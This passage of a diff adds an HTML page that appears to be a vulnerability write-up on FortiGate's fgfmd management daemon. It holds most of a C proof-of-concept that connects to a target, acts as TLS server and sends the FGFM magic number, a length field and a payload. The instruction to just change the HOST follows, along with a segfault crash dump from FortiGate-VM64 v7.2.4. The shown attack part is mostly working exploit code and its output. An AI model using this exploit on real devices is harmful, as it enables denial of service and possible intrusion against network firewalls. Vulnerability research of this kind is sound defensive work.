+  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEYFILE <span class="hljs-meta-string">"key.pem"</span></span>
+  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CERTFILE <span class="hljs-meta-string">"cert.pem"</span></span>
+
+  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> sock;
+    <span class="hljs-keyword">struct</span> sockaddr_in sa={<span class="hljs-number">0</span>};
+    SSL_CTX *ctx;
+    SSL *ssl;
+    <span class="hljs-keyword">const</span> SSL_METHOD *method;
+    <span class="hljs-keyword">uint32_t</span> len_be;
+    <span class="hljs-keyword">char</span> *fgfm_magic=<span class="hljs-string">"\x36\xe0\x11\x00"</span>;
+
+    method=TLS_server_method();
+    ctx=SSL_CTX_new(method);
+    SSL_CTX_use_certificate_file(ctx, CERTFILE, SSL_FILETYPE_PEM);
+    SSL_CTX_use_PrivateKey_file(ctx, KEYFILE, SSL_FILETYPE_PEM);
+    sock=socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);
+    sa.sin_family=AF_INET;
+    sa.sin_port=htons(PORT);
+    sa.sin_addr.s_addr=inet_addr(HOST);
+    connect(sock, &amp;sa, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr));
+    ssl=SSL_new(ctx);
+    SSL_set_fd(ssl, sock);
+
+    <span class="hljs-keyword">if</span>(SSL_accept(ssl)&lt;=<span class="hljs-number">0</span>)
+      ERR_print_errors_fp(<span class="hljs-built_in">stderr</span>);
+    <span class="hljs-keyword">else</span>{
+      len_be=htonl(<span class="hljs-built_in">strlen</span>(payload)+<span class="hljs-number">1</span>+<span class="hljs-number">8</span>);
+      SSL_write(ssl, fgfm_magic, <span class="hljs-number">4</span>);
+      SSL_write(ssl, &amp;len_be, <span class="hljs-number">4</span>);
+      SSL_write(ssl, payload, <span class="hljs-built_in">strlen</span>(payload)+<span class="hljs-number">1</span>);
+    }
+    SSL_shutdown(ssl);
+    SSL_free(ssl);
+    close(sock);
+    SSL_CTX_free(ctx);
+  }
+</code></pre>
+<p>Just change the HOST and provide a key.pem/cert.pem. The hardest part about
+developing a crash POC was realizing the TCP client is acting as the TLS 
+server. The protocol itself is just a magic number, size field, and 
+text-based body.</p>
+<pre><code class="lang-text">  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> firmware FortiGate-VM64 v7<span class="hljs-number">.2</span><span class="hljs-number">.4</span>,build1396b1396,<span class="hljs-number">230131</span> (GA.F) 
+  (Release)
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> application fgfmsd
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> *** signal <span class="hljs-number">11</span> (Segmentation fault) received ***
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> Register dump:
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> RAX: <span class="hljs-number">00007f</span>652c3d2040   RBX: <span class="hljs-number">00007f</span>652c8f7844
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> RCX: <span class="hljs-number">00007f</span>fd3fe86008   RDX: <span class="hljs-number">00007f</span>6531e7afc0
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> R08: <span class="hljs-number">00007f</span>652c3cf010   R09: <span class="hljs-number">0000000000000000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> R10: <span class="hljs-number">0000000000000022</span>   R11: <span class="hljs-number">0000000000000246</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> R12: <span class="hljs-number">00007f</span>fd3fe83780   R13: <span class="hljs-number">0000000000042069</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> R14: <span class="hljs-number">000000000000000</span>b   R15: <span class="hljs-number">0000000000000303</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> RSI: <span class="hljs-number">00007f</span>fd3fe84138   RDI: <span class="hljs-number">00007f</span>fd3fe86000
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> RBP: <span class="hljs-number">00007f</span>fd3fe83fe0   RSP: <span class="hljs-number">00007f</span>fd3fe83690
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> RIP: <span class="hljs-number">00007f</span>6531d65c6c   EFLAGS: <span class="hljs-number">0000000000010212</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> CS:  <span class="hljs-number">0033</span>   FS: <span class="hljs-number">0000</span>   GS: <span class="hljs-number">0000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> Trap: <span class="hljs-number">000000000000000</span>e   Error: <span class="hljs-number">0000000000000004</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> OldMask: <span class="hljs-number">0000000000000000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> CR2: <span class="hljs-number">00007f</span>fd3fe86000
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> stack: <span class="hljs-number">0x7ffd3fe83690</span> - <span class="hljs-number">0x7ffd3fe854d0</span> 
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> Backtrace:
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x7f6531d65c6c</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">00064</span>c6c
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x7f6531d6805d</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">0006705</span>d
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x7f6531d7b826</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">0007</span>a826
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x7f6531d54d42</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span> 
+  (__snprintf+<span class="hljs-number">0x00000092</span>) liboffset <span class="hljs-number">00053</span>d42
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00acc6aa</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00acd30c</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00acdcef</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00aee12a</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00ae8674</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00ad60ba</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00ae1d11</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00449eaf</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x004531da</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x0044fd9c</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00452428</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00452d71</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd  
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x7f6531d24deb</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span> 
+  (__libc_start_main+<span class="hljs-number">0x000000eb</span>) liboffset <span class="hljs-number">00023</span>deb
+  <span class="hljs-params">&lt;<span class="hljs-number">23066</span>&gt;</span> [<span class="hljs-number">0x00444f1a</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>fgfmd
+</code></pre>
+<p><strong>END</strong></p>
+<hr/>
+<p>The site is operated with support of the following sponsors:</p>
+
+<img alt="linuxfoundation" src="../images/thelinuxfoundation.png"/ class="sponsor">
+<img alt="red-hatcomunity" src="../images/redhat-community.png" class="sponsor"/>
+<img alt="constellix-green-logo" src="../images/constellix-green-logo.png" cloass="sponsor"/>
+<img alt="gromacs" src="../images/gromacs.webp" width="140px" class="sponsor"/>
+<img alt="namd" src="../images/namd.jpeg" width="140px" class="sponsor"/>
+
+<hr/>
+<center>2005-2024 &copy;</center>
+</body>
+</html>
